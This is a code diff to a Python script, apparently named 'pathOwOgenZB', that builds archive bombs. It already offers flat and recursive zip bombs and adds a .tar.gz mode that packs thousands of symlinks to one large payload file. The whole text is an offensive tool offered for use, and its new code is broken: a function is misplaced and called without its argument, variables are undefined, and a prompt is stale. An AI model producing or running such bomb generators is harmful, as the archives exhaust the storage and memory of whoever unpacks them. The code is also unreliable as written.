@@ -2,6 +2,9 @@
 
 import os
 import zipfile
+import tarfile
+import shutil
+from pathlib import Path
 
 # Welcoming stuff and cwd finding
 print("Welcome to pathOwOgenZB by Arco!")
@@ -9,8 +12,8 @@ print("Current working directory:", os.getcwd())
 
 # Zip mode selection
 while True:
-    zip_mode = input("Choose mode: (1) Flat Zip Bomb, (2) Recursive Zip Bomb: ")
-    if zip_mode in ["1", "2"]:
+    zip_mode = input("Choose mode: (1) Flat Zip Bomb, (2) Recursive Zip Bomb, (3) .tar.gz Bomb: ")
+    if zip_mode in ["1", "2", "3"]:
         break
     else:
         print("Enter 1 or 2.")
@@ -65,7 +68,7 @@ if zip_mode == "1":
     print("Removed the payload file")
 
 # Recursive mode
-else:
+if zip_mode == "2":
     while True:
         zip_name = input("Final recursive zip bomb name (must end in .zip!)? ")
         if zip_name.endswith(".zip"):
@@ -103,3 +106,46 @@ else:
     print("[DEBUG] Payload file created?")
     print("Exists:", os.path.exists(payload_name))
     recursive_zip()
+
+# UNIX bomb style
+else:
+
+    tar_name = input("Final archive name (must end in .tar.gz): ")
+    if not tar_name.endswith(".tar.gz"):
+        print("Invalid extension. Appending '.tar.gz'")
+        tar_name += ".tar.gz"
+
+    copies = int(input("How many symlinked files should be in the tar? (Try 10,000): "))
+    user_file_name = input("What should the files be named in the archive (no spaces)? ")
+
+    temp_dir = "tarbomb_temp"
+    os.makedirs(temp_dir, exist_ok=True)
+
+    def create_payload():
+        with open(payload_name, "w") as f:
+            f.write(payload_contents * 1024 * 1024 * size_mb)
+        print(f"Payload created: {payload_name} ({size_mb}MB)")
+
+def create_tar_symlink_bomb(payload_path):
+    for i in range(copies):
+        link_name = Path(temp_dir) / f"{user_file_name}{i}.txt"
+        try:
+            os.symlink(payload_path, link_name)
+        except Exception as e:
+            print(f"[!] Failed to create symlink {link_name}: {e}")
+            continue
+        if i % 1000 == 0:
+            print(f"Created {i} symlinks...")
+
+    with tarfile.open(tar_name, "w:gz") as tar:
+        tar.add(temp_dir, arcname=".")
+
+    print(f"\nTAR.GZ Bomb created: {tar_name}")
+    shutil.rmtree(temp_dir)
+    os.remove(payload_path)
+
+
+    # Execute
+    create_payload()
+    payload_path = os.path.abspath(payload_name)
+    create_tar_symlink_bomb()
